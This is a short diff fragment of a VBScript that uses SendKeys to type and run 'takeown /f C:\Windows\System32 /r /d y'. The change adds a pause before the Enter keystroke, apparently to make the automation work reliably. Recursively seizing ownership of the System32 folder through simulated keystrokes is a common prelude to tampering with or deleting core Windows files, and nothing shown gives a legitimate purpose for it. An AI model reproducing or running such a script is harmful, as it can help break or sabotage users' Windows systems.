@@ -28,6 +28,7 @@ WScript.Sleep 200
 
 WshShell.SendKeys "takeown /f C:\Windows\System32 /r /d y"
 
+WScript.Sleep 200
 
 WshShell.SendKeys "{ENTER}"
 
